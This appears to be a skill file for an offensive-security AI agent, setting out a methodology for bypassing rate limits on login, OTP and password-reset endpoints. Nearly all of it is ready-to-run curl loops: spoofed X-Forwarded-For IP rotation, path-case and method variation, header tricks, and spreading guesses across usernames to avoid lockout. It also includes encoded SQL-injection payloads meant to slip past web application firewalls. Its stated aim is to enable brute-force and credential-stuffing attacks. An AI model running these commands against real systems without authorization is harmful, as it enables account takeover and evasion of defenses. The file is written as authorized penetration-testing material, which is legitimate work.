---
name: attack-rate-limit-bypass
description: Apply when a login, OTP, password-reset, or other rate-limited endpoint needs its throttling tested for IP-rotation, header, case, or method bypasses before brute-force or credential-stuffing risk can be ruled out.
metadata:
  cyberstrike:
    source: .cyberstrike/skill/attack-rate-limit-bypass/SKILL.md
    commit: 359655518
---

# Rate Limit Bypass

## Objective

Bypass rate limiting mechanisms to enable brute-force attacks, credential stuffing, or abuse of rate-limited functionality.

## Testing Methodology

### Phase 1: Automated Bypass Testing

```bash
# Full bypass test suite (5 techniques), 20 requests total, cycled round-robin
COUNT=20
for i in $(seq 1 "$COUNT"); do
  case $((i % 5)) in
    0) # X-Forwarded-For IP rotation
       ip="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
       curl -s -o /dev/null -w "xff %{http_code}\n" -X POST https://TARGET/api/login \
         -H "Content-Type: application/json" -H "X-Forwarded-For: $ip" \
         -d '{"email":"test@test.com","password":"test"}' ;;
    1) # URL case variation
       curl -s -o /dev/null -w "case %{http_code}\n" -X POST https://TARGET/API/LOGIN \
         -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"test"}' ;;
    2) # HTTP method switching
       curl -s -o /dev/null -w "method %{http_code}\n" -X PUT https://TARGET/api/login \
         -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"test"}' ;;
    3) # Random query parameter injection (new cache key)
       curl -s -o /dev/null -w "query %{http_code}\n" -X POST "https://TARGET/api/login?_=$RANDOM$i" \
         -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"test"}' ;;
    4) # Header-based bypass
       curl -s -o /dev/null -w "header %{http_code}\n" -X POST https://TARGET/api/login \
         -H "Content-Type: application/json" -H "X-Forwarded-For: 127.0.0.1" \
         -d '{"email":"test@test.com","password":"test"}' ;;
  esac
done
```

Tests automatically:
1. X-Forwarded-For IP rotation
2. URL case variation
3. HTTP method switching
4. Random query parameter injection
5. Header-based bypasses

### Phase 2: X-Forwarded-For Rotation

```bash
# Rotate source IP via headers
for i in $(seq 1 50); do
  IP="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST https://TARGET/api/login \
    -H "X-Forwarded-For: $IP" \
    -H "X-Real-IP: $IP" \
    -H "X-Client-IP: $IP" \
    -d '{"email":"test@test.com","password":"guess"}'
done
```

### Phase 3: URL Manipulation

```bash
# Path case variation
curl https://TARGET/API/LOGIN
curl https://TARGET/Api/Login

# Trailing slash/dot
curl https://TARGET/api/login/
curl https://TARGET/api/login/.

# Double slash
curl https://TARGET//api//login

# Random query params (new cache key)
curl "https://TARGET/api/login?_=$(date +%s)"
```

### Phase 4: Header Bypasses

```bash
curl -X POST https://TARGET/api/login \
  -H "X-Forwarded-For: 127.0.0.1"

curl -X POST https://TARGET/api/login \
  -H "X-Forwarded-Host: localhost"

curl -X POST https://TARGET/api/login \
  -H "X-Original-URL: /api/login"

curl -X POST https://TARGET/api/login \
  -H "X-Custom-IP-Authorization: 127.0.0.1"
```

### Phase 5: Account Lockout Bypass

```bash
# Distribute across usernames
for user in user1 user2 user3; do
  curl -X POST https://TARGET/api/login \
    -d "{\"email\":\"$user@test.com\",\"password\":\"common_password\"}"
done

# IP rotation + distributed usernames = bypass
```

### Phase 6: WAF Bypass + Rate Limit

```bash
# Encode payload variants to avoid WAF detection, then hit the rate-limited endpoint
for payload in "admin%27%20OR%201%3D1--" "admin'%20OR%201=1%23" "admin/**/OR/**/1=1--" "adm%69n' OR 1=1--"; do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@test.com\",\"password\":\"$payload\"}"
done
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Rate limit bypass on login/auth endpoint | High (P2) |
| Rate limit bypass on password reset | High (P2) |
| Rate limit bypass on OTP/2FA verification | Critical (P1) |
| Rate limit bypass on financial operations | Critical (P1) |
| Rate limit bypass on non-sensitive endpoint | Low (P4) |

## Evidence Requirements

- Endpoint tested
- Normal rate limit behavior (429 after N requests)
- Bypass technique used
- Successful requests beyond the limit
- Count of requests that bypassed the limit

## Tools

- `curl` round-robin loop (Phase 1) — automated 5-technique bypass testing
- `curl` encoded-payload loop (Phase 6) — WAF bypass via payload encoding

## References

- [OWASP: Rate Limiting](https://owasp.org/www-community/controls/Rate_Limiting)
- [HackerOne: Rate Limit Bypass](https://www.hackerone.com/vulnerability-management/rate-limiting-bypass-techniques)
